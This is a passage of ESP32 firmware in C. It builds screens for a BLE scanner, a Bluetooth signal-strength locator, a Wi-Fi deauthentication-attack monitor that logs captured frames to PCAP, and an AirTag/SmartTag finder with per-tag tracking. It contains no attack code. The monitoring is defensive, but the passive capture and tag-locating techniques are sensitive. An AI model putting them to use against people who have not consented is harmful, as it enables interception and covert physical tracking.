        snprintf(mac_text, sizeof(mac_text), "Device: %s", addr_str);
        lv_label_set_text(bt_locator_mac_label, mac_text);
        lv_obj_clear_flag(bt_locator_mac_label, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Hide status label and header when tracking
    if (bt_locator_status_label) {
        lv_obj_add_flag(bt_locator_status_label, LV_OBJ_FLAG_HIDDEN);
    }
    if (bt_locator_content) {
        lv_obj_t *header = (lv_obj_t *)lv_obj_get_user_data(bt_locator_content);
        if (header) {
            lv_obj_add_flag(header, LV_OBJ_FLAG_HIDDEN);
        }
    }
    
    // Start tracking task
    bt_locator_tracking_active = true;
    bt_tracking_mode = true;
    
    BaseType_t task_ret = xTaskCreate(
        bt_locator_tracking_task,
        "bt_locator_task",
        4096,
        NULL,
        5,
        &bt_locator_task_handle
    );
    
    if (task_ret != pdPASS) {
        bt_locator_tracking_active = false;
        bt_tracking_mode = false;
        if (bt_locator_status_label) {
            lv_label_set_text(bt_locator_status_label, "Failed to start tracking!");
        }
    }
}

/**
 * Update BT Locator list UI with clickable device items
 */
static void bt_locator_update_list(void)
{
    if (!bt_locator_list) return;
    
    // Clear existing items
    lv_obj_clean(bt_locator_list);
    
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        char addr_str[18];
        bt_format_addr(dev->addr, addr_str);
        
        char item_text[80];
        if (dev->name[0] != '\0') {
            char short_name[16];
            strncpy(short_name, dev->name, 15);
            short_name[15] = '\0';
            snprintf(item_text, sizeof(item_text), "%d dBm  %s  %s", 
                     dev->rssi, short_name, addr_str);
        } else {
            snprintf(item_text, sizeof(item_text), "%d dBm  %s", 
                     dev->rssi, addr_str);
        }
        
        // Create a clickable button for each device (no border, subtle pressed color)
        lv_obj_t *btn = lv_btn_create(bt_locator_list);
        lv_obj_set_size(btn, lv_pct(100), 32);
        lv_obj_set_style_bg_color(btn, ui_card_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(btn, lv_color_make(50, 50, 50), LV_STATE_PRESSED);  // Subtle gray on press
        lv_obj_set_style_border_width(btn, 0, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        
        lv_obj_t *lbl = lv_label_create(btn);
        lv_label_set_text(lbl, item_text);
        lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 5, 0);
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_CLIP);
        
        // Store device index as user data
        lv_obj_add_event_cb(btn, bt_locator_device_selected_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
    }
}

/**
 * BLE scan task - runs for 10 seconds then stops
 */
static void bt_scan_task(void *pvParameters)
{
    bt_reset_counters();
    ble_scan_finished = false;
    
    ESP_LOGI(TAG, "BLE scan starting (10 seconds)...");
    
    int rc = bt_start_scan();
    if (rc != 0) {
        ESP_LOGE(TAG, "BLE scan start failed: %d", rc);
        bt_scan_active = false;
        bt_scan_task_handle = NULL;
        
        // Set status for UI update (thread-safe)
        snprintf(ble_scan_status_text, sizeof(ble_scan_status_text), "Scan failed!");
        ble_scan_needs_ui_update = true;
        bt_locator_needs_ui_update = true;  // Also update BT Locator if active
        
        vTaskDelete(NULL);
        return;
    }
    
    // Scan for 10 seconds, updating UI every 500ms via flag
    for (int i = 0; i < 100 && bt_scan_active; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Update UI every 500ms via flag (thread-safe)
        if (i % 5 == 0) {
            snprintf(ble_scan_status_text, sizeof(ble_scan_status_text),
                     "Scanning... %d (%ds)", bt_device_count, (100 - i) / 10);
            ble_scan_needs_ui_update = true;
            bt_locator_needs_ui_update = true;
            bt_sas_needs_update = true;
        }
    }
    
    bt_stop_scan();
    bt_scan_active = false;
    
    // Final UI update via flag (thread-safe)
    snprintf(ble_scan_status_text, sizeof(ble_scan_status_text), 
             "%d devices (%d AT, %d ST)", bt_device_count, bt_airtag_count, bt_smarttag_count);
    ble_scan_finished = true;
    ble_scan_needs_ui_update = true;
    bt_locator_needs_ui_update = true;
    bt_sas_needs_update = true;
    
    ESP_LOGI(TAG, "BLE scan complete: %d devices found", bt_device_count);
    
    bt_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * BLE Scan Back button callback
 */
static void ble_scan_back_btn_cb(lv_event_t *e)
{
    // Stop scan if running (waits for task to finish)
    bt_scan_stop();
    
    // Clean up UI
    ble_scan_ui_active = false;
    ble_scan_list = NULL;
    ble_scan_status_label = NULL;
    ble_scan_content = NULL;
    
    // Switch back to WiFi mode
    if (current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }
    
    // Return to menu
    nav_to_menu_flag = true;
}

// ============================================================================
// DEAUTH MONITOR IMPLEMENTATION
// ============================================================================

// Helper function to find SSID by BSSID from scan results
static const char* deauth_monitor_find_ssid_by_bssid(const uint8_t *bssid)
{
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t count = count_ptr ? *count_ptr : 0;
    
    for (uint16_t i = 0; i < count; i++) {
        if (memcmp(records[i].bssid, bssid, 6) == 0) {
            return (const char*)records[i].ssid;
        }
    }
    return NULL;
}

// Channel hopping for deauth monitor
static void deauth_monitor_channel_hop(void)
{
    if (!deauth_monitor_active) {
        return;
    }
    
    deauth_monitor_current_channel = dual_band_channels[deauth_monitor_channel_index];
    deauth_monitor_channel_index++;
    if (deauth_monitor_channel_index >= dual_band_channels_count) {
        deauth_monitor_channel_index = 0;
    }
    
    esp_wifi_set_channel(deauth_monitor_current_channel, WIFI_SECOND_CHAN_NONE);
    deauth_monitor_last_channel_hop = esp_timer_get_time() / 1000;
}

// Promiscuous callback for detecting deauth frames
static void deauth_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!deauth_monitor_active) {
        return;
    }
    
    // Filter only MGMT packets (deauth is a management frame)
    if (type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) { // Minimum 802.11 header size
        return;
    }
    
    // Check if this is a deauthentication frame
    // Frame Control: Type=0 (Management), Subtype=12 (Deauthentication)
    // Frame Control byte 0: 0xC0 = (subtype << 4) | (type << 2) = (12 << 4) | (0 << 2) = 0xC0
    uint8_t frame_type = frame[0] & 0xFC;
    if (frame_type != 0xC0) {
        return; // Not a deauthentication frame
    }
    
    // Extract BSSID (Address 3 in management frames) at offset 16
    const uint8_t *bssid = &frame[16];
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // Lookup SSID
    const char *ssid = deauth_monitor_find_ssid_by_bssid(bssid);
    
    // Add to attacks array (thread-safe)
    portENTER_CRITICAL(&deauth_monitor_spin);
    
    int idx = deauth_monitor_attack_count % DEAUTH_MONITOR_MAX_ATTACKS;
    
    if (ssid && ssid[0] != '\0') {
        strncpy(deauth_monitor_attacks[idx].ssid, ssid, 32);
        deauth_monitor_attacks[idx].ssid[32] = '\0';
    } else {
        snprintf(deauth_monitor_attacks[idx].ssid, 33, "%02X:%02X:%02X:%02X:%02X:%02X",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    }
    memcpy(deauth_monitor_attacks[idx].bssid, bssid, 6);
    deauth_monitor_attacks[idx].rssi = rssi;
    deauth_monitor_attacks[idx].channel = deauth_monitor_current_channel;
    deauth_monitor_attacks[idx].timestamp = esp_timer_get_time() / 1000;
    
    if (deauth_monitor_attack_count < DEAUTH_MONITOR_MAX_ATTACKS) {
        deauth_monitor_attack_count++;
    }
    
    deauth_monitor_update_flag = true;
    
    portEXIT_CRITICAL(&deauth_monitor_spin);

    // Enqueue raw frame for PCAP write (non-blocking — never stall the WiFi task)
    if (deauth_pcap_queue) {
        deauth_pcap_frame_t pf;
        int copy_len = len < (int)sizeof(pf.frame) ? len : (int)sizeof(pf.frame);
        memcpy(pf.frame, frame, copy_len);
        pf.len          = (uint16_t)copy_len;
        pf.rssi         = rssi;
        pf.timestamp_us = esp_timer_get_time();
        xQueueSend(deauth_pcap_queue, &pf, 0);
    }

    /*ESP_LOGI(TAG, "[DEAUTH] CH: %d | %s | RSSI: %d",
             deauth_monitor_current_channel,
             deauth_monitor_attacks[idx].ssid,
             rssi);*/
}

// Channel hopping task for deauth monitor
static void deauth_monitor_task(void *pvParameters)
{
    (void)pvParameters;
    
    ESP_LOGI(TAG, "Deauth monitor task started");
    
    while (deauth_monitor_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms

        if (!deauth_monitor_active) {
            break;
        }

        // Drain queued raw frames to PCAP file
        if (deauth_pcap_queue && deauth_pcap_file && sd_spi_mutex &&
            xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
            deauth_pcap_frame_t pf;
            while (xQueueReceive(deauth_pcap_queue, &pf, 0) == pdTRUE) {
                pcap_record_header_t rh;
                rh.ts_sec  = (uint32_t)(pf.timestamp_us / 1000000);
                rh.ts_usec = (uint32_t)(pf.timestamp_us % 1000000);
                rh.incl_len = pf.len;
                rh.orig_len = pf.len;
                fwrite(&rh, sizeof(rh), 1, deauth_pcap_file);
                fwrite(pf.frame, 1, pf.len, deauth_pcap_file);
            }
            fflush(deauth_pcap_file);
            xSemaphoreGive(sd_spi_mutex);
        }

        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - deauth_monitor_last_channel_hop >= sniffer_channel_hop_delay_ms);

        if (time_expired) {
            deauth_monitor_channel_hop();
        }
    }
    
    ESP_LOGI(TAG, "Deauth monitor task ending");
    deauth_monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

// Exit callback for deauth monitor
static void deauth_monitor_exit_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping deauth monitor...");

    // Stop monitoring (task will stop enqueuing frames)
    deauth_monitor_active = false;
    deauth_monitor_ui_active = false;
    deauth_monitor_scan_pending = false;

    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);

    // Wait for task to do one final drain cycle then exit
    if (deauth_monitor_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(150));
    }

    // Flush and close PCAP file
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
        if (deauth_pcap_file) {
            // Drain any remaining queued frames
            if (deauth_pcap_queue) {
                deauth_pcap_frame_t pf;
                while (xQueueReceive(deauth_pcap_queue, &pf, 0) == pdTRUE) {
                    pcap_record_header_t rh;
                    rh.ts_sec  = (uint32_t)(pf.timestamp_us / 1000000);
                    rh.ts_usec = (uint32_t)(pf.timestamp_us % 1000000);
                    rh.incl_len = pf.len;
                    rh.orig_len = pf.len;
                    fwrite(&rh, sizeof(rh), 1, deauth_pcap_file);
                    fwrite(pf.frame, 1, pf.len, deauth_pcap_file);
                }
            }
            fflush(deauth_pcap_file);
            fclose(deauth_pcap_file);
            deauth_pcap_file = NULL;
            ESP_LOGI(TAG, "Deauth PCAP saved: %s", deauth_pcap_path);
        }
        xSemaphoreGive(sd_spi_mutex);
    }
    if (deauth_pcap_queue) {
        vQueueDelete(deauth_pcap_queue);
        deauth_pcap_queue = NULL;
    }
    deauth_pcap_path[0] = '\0';

    // Free task stack
    if (deauth_monitor_task_stack != NULL) {
        heap_caps_free(deauth_monitor_task_stack);
        deauth_monitor_task_stack = NULL;
    }

    // Reset state
    deauth_monitor_attack_count = 0;
    deauth_monitor_channel_index = 0;
    deauth_monitor_current_channel = 1;

    // Navigate to menu
    nav_to_menu_flag = true;
}

// Helper to start deauth monitoring after scan completes
static void deauth_monitor_start_monitoring(void)
{
    // Update status labels
    if (deauth_monitor_status_label && lv_obj_is_valid(deauth_monitor_status_label)) {
        lv_label_set_text(deauth_monitor_status_label, "MONITORING");
        lv_obj_set_style_text_font(deauth_monitor_status_label, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(deauth_monitor_status_label, COLOR_MATERIAL_RED, 0);
    }
    if (deauth_monitor_known_label && lv_obj_is_valid(deauth_monitor_known_label)) {
        uint16_t scan_count = wifi_scanner_get_count();
        char known_text[48];
        snprintf(known_text, sizeof(known_text), "%d networks known\n\nNo attacks recorded yet", scan_count);
        lv_label_set_text(deauth_monitor_known_label, known_text);
        lv_obj_clear_flag(deauth_monitor_known_label, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Start deauth monitor
    deauth_monitor_active = true;
    deauth_monitor_channel_index = 0;
    deauth_monitor_current_channel = dual_band_channels[0];
    esp_wifi_set_channel(deauth_monitor_current_channel, WIFI_SECOND_CHAN_NONE);
    deauth_monitor_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Set promiscuous filter for MGMT frames only
    wifi_promiscuous_filter_t mgmt_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&mgmt_filter);
    esp_wifi_set_promiscuous_rx_cb(deauth_monitor_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Create channel hopping task with PSRAM stack
    deauth_monitor_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (deauth_monitor_task_stack) {
        deauth_monitor_task_handle = xTaskCreateStatic(
            deauth_monitor_task,
            "deauth_mon",
            4096,
            NULL,
            5,
            deauth_monitor_task_stack,
            &deauth_monitor_task_buffer
        );
    } else {
        ESP_LOGE(TAG, "Failed to allocate deauth monitor task stack");
    }
    
    // Open PCAP file on SD for raw frame capture
    deauth_pcap_queue = xQueueCreate(16, sizeof(deauth_pcap_frame_t));
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
        struct stat st = {0};
        if (stat("/sdcard/lab/deauths", &st) == -1) {
            mkdir("/sdcard/lab", 0777);
            mkdir("/sdcard/lab/deauths", 0700);
        }
        snprintf(deauth_pcap_path, sizeof(deauth_pcap_path),
                 "/sdcard/lab/deauths/deauth_%llu.pcap",
                 (unsigned long long)(esp_timer_get_time() / 1000));
        deauth_pcap_file = fopen(deauth_pcap_path, "wb");
        if (deauth_pcap_file) {
            pcap_global_header_t gh = {
                .magic_number  = 0xa1b2c3d4,
                .version_major = 2,
                .version_minor = 4,
                .thiszone      = 0,
                .sigfigs       = 0,
                .snaplen       = 65535,
                .network       = LINKTYPE_IEEE80211
            };
            fwrite(&gh, sizeof(gh), 1, deauth_pcap_file);
            fflush(deauth_pcap_file);
        }
        xSemaphoreGive(sd_spi_mutex);
    }

    // Update recording status label
    if (deauth_monitor_rec_label && lv_obj_is_valid(deauth_monitor_rec_label)) {
        if (deauth_pcap_file) {
            // Show just the filename portion to fit the bar
            const char *fname = strrchr(deauth_pcap_path, '/');
            fname = fname ? fname + 1 : deauth_pcap_path;
            char rec_buf[80];
            snprintf(rec_buf, sizeof(rec_buf), LV_SYMBOL_SD_CARD " %s", fname);
            lv_label_set_text(deauth_monitor_rec_label, rec_buf);
            lv_obj_set_style_text_color(deauth_monitor_rec_label, COLOR_MATERIAL_RED, 0);
        } else {
            lv_label_set_text(deauth_monitor_rec_label, LV_SYMBOL_SD_CARD " SD unavailable");
            lv_obj_set_style_text_color(deauth_monitor_rec_label, lv_color_make(150, 150, 150), 0);
        }
    }

    ESP_LOGI(TAG, "Deauth monitor started after scan");
}

// Show deauth monitor screen
static void show_deauth_monitor_screen(void)
{
    // Ensure WiFi mode is active
    if (!ensure_wifi_mode()) {
        ESP_LOGE(TAG, "Failed to switch to WiFi mode for deauth monitor");
        return;
    }
    
    create_function_page_base("Deauth Monitor");
    
    // Reset attack data
    portENTER_CRITICAL(&deauth_monitor_spin);
    deauth_monitor_attack_count = 0;
    deauth_monitor_update_flag = false;
    portEXIT_CRITICAL(&deauth_monitor_spin);
    
    // Status label - "MONITORING" header (red, bold) or scanning notice
    deauth_monitor_status_label = lv_label_create(function_page);
    lv_label_set_text(deauth_monitor_status_label, LV_SYMBOL_WIFI "  Scanning networks...\n\nPlease wait");
    lv_obj_set_style_text_align(deauth_monitor_status_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(deauth_monitor_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(deauth_monitor_status_label, ui_text_color(), 0);
    lv_obj_align(deauth_monitor_status_label, LV_ALIGN_CENTER, 0, -30);

    // Known networks sub-label (grey, shown once monitoring starts)
    deauth_monitor_known_label = lv_label_create(function_page);
    lv_label_set_text(deauth_monitor_known_label, "");
    lv_obj_set_style_text_align(deauth_monitor_known_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(deauth_monitor_known_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(deauth_monitor_known_label, lv_color_make(176, 176, 176), 0);
    lv_obj_align(deauth_monitor_known_label, LV_ALIGN_CENTER, 0, -4);
    lv_obj_add_flag(deauth_monitor_known_label, LV_OBJ_FLAG_HIDDEN);
    
    // Create attack list (hidden initially)
    deauth_monitor_list = lv_list_create(function_page);
    lv_obj_set_size(deauth_monitor_list, lv_pct(100), LCD_V_RES - 30 - 95);  // Leave space for title, rec label, and exit button
    lv_obj_align(deauth_monitor_list, LV_ALIGN_TOP_MID, 0, 35);
    lv_obj_set_style_bg_color(deauth_monitor_list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(deauth_monitor_list, 0, LV_PART_ITEMS);
    lv_obj_add_flag(deauth_monitor_list, LV_OBJ_FLAG_HIDDEN);  // Hidden until attacks detected
    
    // Add list title
    lv_obj_t *list_title = lv_list_add_text(deauth_monitor_list, "Most recent attacks:");
    lv_obj_set_style_text_color(list_title, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_font(list_title, &lv_font_montserrat_14, 0);
    
    // Red Exit button at bottom — compact single-row size leaves room for a second button
    lv_obj_t *exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(exit_btn, 110, 28);
    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_set_style_shadow_width(exit_btn, 4, 0);
    lv_obj_set_style_shadow_color(exit_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(exit_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(exit_btn, 4, 0);
    lv_obj_set_style_pad_hor(exit_btn, 8, 0);
    lv_obj_set_style_pad_column(exit_btn, 4, 0);
    lv_obj_set_flex_flow(exit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *exit_icon = lv_label_create(exit_btn);
    lv_label_set_text(exit_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(exit_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(exit_icon, ui_text_color(), 0);

    lv_obj_t *exit_text = lv_label_create(exit_btn);
    lv_label_set_text(exit_text, "Exit");
    lv_obj_set_style_text_font(exit_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_text, ui_text_color(), 0);

    lv_obj_add_event_cb(exit_btn, deauth_monitor_exit_cb, LV_EVENT_CLICKED, NULL);

    // Recording status label — updated once monitoring starts
    deauth_monitor_rec_label = lv_label_create(function_page);
    lv_label_set_text(deauth_monitor_rec_label, LV_SYMBOL_SD_CARD " Waiting for scan...");
    lv_obj_set_style_text_font(deauth_monitor_rec_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(deauth_monitor_rec_label, lv_color_make(150, 150, 150), 0);
    lv_obj_set_style_text_align(deauth_monitor_rec_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(deauth_monitor_rec_label, lv_pct(100));
    lv_obj_align(deauth_monitor_rec_label, LV_ALIGN_BOTTOM_MID, 0, -46);

    // Set UI active but not monitoring yet (waiting for scan)
    deauth_monitor_ui_active = true;
    deauth_monitor_active = false;  // Will be set true after scan
    deauth_monitor_scan_pending = true;
    
    // Start WiFi scan to gather network SSIDs
    ESP_LOGI(TAG, "Starting WiFi scan for deauth monitor...");
    wifi_scanner_start_scan();
}

// ============================================================================
// AIRTAG SCANNER IMPLEMENTATION
// ============================================================================

// AirTag scan task - continuous BLE scanning
static void airtag_scan_task(void *pvParameters)
{
    (void)pvParameters;
    
    ESP_LOGI(TAG, "AirTag scanner task started");
    
    while (airtag_scan_active) {
        // Reset counters for each scan cycle
        bt_reset_counters();
        
        // Start BLE scan
        int rc = bt_start_scan();
        if (rc != 0) {
            ESP_LOGE(TAG, "BLE scan start failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Scan for 10 seconds
        for (int i = 0; i < 100 && airtag_scan_active; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Stop scan
        bt_stop_scan();
        
        if (!airtag_scan_active) {
            break;
        }
        
        // Save snapshot for UI before reset
        airtag_scan_snapshot_airtag = bt_airtag_count;
        airtag_scan_snapshot_smarttag = bt_smarttag_count;
        airtag_scan_snapshot_total = bt_device_count;
        
        // Signal UI update
        airtag_scan_update_flag = true;
        
        ESP_LOGI(TAG, "AirTag scan cycle: %d AT, %d ST, %d total",
                 airtag_scan_snapshot_airtag, airtag_scan_snapshot_smarttag, airtag_scan_snapshot_total);
    }
    
    ESP_LOGI(TAG, "AirTag scanner task ending");
    airtag_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

// Exit callback for AirTag scanner
static void airtag_scan_exit_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping AirTag scanner...");
    
    // Stop scanning
    airtag_scan_active = false;
    airtag_scan_ui_active = false;
    
    // Stop BLE scan
    bt_stop_scan();
    
    // Wait for task to finish
    if (airtag_scan_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    // Free task stack
    if (airtag_scan_task_stack != NULL) {
        heap_caps_free(airtag_scan_task_stack);
        airtag_scan_task_stack = NULL;
    }
    
    // Switch back to WiFi mode
    if (current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }
    
    // Return to Bluetooth screen
    show_bluetooth_screen();
}

/**
 * Button callback: navigate from AirTag scan screen to Found Tags list
 */
static void airtag_view_tags_btn_cb(lv_event_t *e)
{
    (void)e;
    show_found_tags_screen();
}

/**
 * Button callback: return from Found Tags list back to AirTag scan screen
 */
static void found_tags_back_btn_cb(lv_event_t *e)
{
    (void)e;
    show_airtag_scan_screen();
}

/**
 * Callback for "Track" button on a found-tag row — launches tag tracker for that device
 */
static void found_tag_track_btn_cb(lv_event_t *e)
{
    int dev_idx = (int)(intptr_t)lv_event_get_user_data(e);
    show_tag_tracker_screen(dev_idx);
}

/**
 * Show a scrollable list of detected AirTags and SmartTags with a Track button per entry
 */
static void show_found_tags_screen(void)
{
    // Pause the airtag scan update flag so list is stable while browsing
    // (scan task continues but UI updates are suppressed)
    airtag_scan_ui_active = false;

    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    create_function_page_base("Found Tags");

    // Scrollable list container
    lv_obj_t *list = lv_obj_create(function_page);
    lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 43);
    lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(list, 0, 0);
    lv_obj_set_style_pad_all(list, 4, 0);
    lv_obj_set_style_pad_gap(list, 4, 0);
    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scrollbar_mode(list, LV_SCROLLBAR_MODE_AUTO);

    int found = 0;
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        if (!dev->is_airtag && !dev->is_smarttag) continue;
        found++;

        // Row container
        lv_obj_t *row = lv_obj_create(list);
        lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(row, ui_card_color(), 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_all(row, 6, 0);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

        // Type badge: "AirTag" or "SmartTag"
        lv_obj_t *type_label = lv_label_create(row);
        lv_label_set_text(type_label, dev->is_airtag ? "AirTag" : "SmartTag");
        lv_obj_set_style_text_font(type_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(type_label,
            dev->is_airtag ? lv_color_make(255, 149, 0) : lv_color_make(90, 200, 250), 0);
        lv_obj_align(type_label, LV_ALIGN_TOP_LEFT, 0, 0);

        // MAC address
        char addr_str[18];
        bt_format_addr(dev->addr, addr_str);
        lv_obj_t *mac_label = lv_label_create(row);
        lv_label_set_text(mac_label, addr_str);
        lv_obj_set_style_text_font(mac_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(mac_label, lv_color_make(176, 176, 176), 0);
        lv_obj_align(mac_label, LV_ALIGN_TOP_LEFT, 0, 18);

        // Name (if available)
        if (dev->name[0] != '\0') {
            lv_obj_t *name_label = lv_label_create(row);
            lv_label_set_text(name_label, dev->name);
            lv_obj_set_style_text_font(name_label, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(name_label, ui_text_color(), 0);
            lv_obj_align(name_label, LV_ALIGN_TOP_LEFT, 0, 32);
        }

        // RSSI
        char rssi_buf[16];
        snprintf(rssi_buf, sizeof(rssi_buf), "%d dBm", (int)dev->rssi);
        lv_obj_t *rssi_label = lv_label_create(row);
        lv_label_set_text(rssi_label, rssi_buf);
        lv_obj_set_style_text_font(rssi_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(rssi_label, lv_color_make(176, 176, 176), 0);
        lv_obj_align(rssi_label, LV_ALIGN_TOP_RIGHT, -70, 0);

        // Track button
        lv_obj_t *track_btn = lv_btn_create(row);
        lv_obj_set_size(track_btn, 60, 36);
        lv_obj_align(track_btn, LV_ALIGN_TOP_RIGHT, 0, 4);
        lv_obj_set_style_bg_color(track_btn, COLOR_MATERIAL_BLUE, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(track_btn, lv_color_lighten(COLOR_MATERIAL_BLUE, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(track_btn, 0, 0);
        lv_obj_set_style_radius(track_btn, 6, 0);
        lv_obj_t *track_lbl = lv_label_create(track_btn);
        lv_label_set_text(track_lbl, "Track");
        lv_obj_set_style_text_font(track_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(track_lbl, lv_color_white(), 0);
        lv_obj_center(track_lbl);
        lv_obj_add_event_cb(track_btn, found_tag_track_btn_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }

    if (found == 0) {
        lv_obj_t *empty = lv_label_create(list);
        lv_label_set_text(empty, "No tags found yet.");
        lv_obj_set_style_text_color(empty, lv_color_make(176, 176, 176), 0);
        lv_obj_set_style_text_font(empty, &lv_font_montserrat_14, 0);
        lv_obj_center(empty);
    }

    // Back button (compact row)
    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 28);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_style_shadow_width(back_btn, 4, 0);
    lv_obj_set_style_shadow_color(back_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(back_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(back_btn, 4, 0);
    lv_obj_set_style_pad_hor(back_btn, 8, 0);
    lv_obj_set_style_pad_column(back_btn, 4, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(back_icon, lv_color_white(), 0);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, "Back");
    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
    lv_obj_add_event_cb(back_btn, found_tags_back_btn_cb, LV_EVENT_CLICKED, NULL);
}

/**
 * Launch BT Locator tracking directly for a specific tag device index.
 * Skips the BT scan/list phase and jumps straight into RSSI tracking.
 */
static void show_tag_tracker_screen(int dev_idx)
{
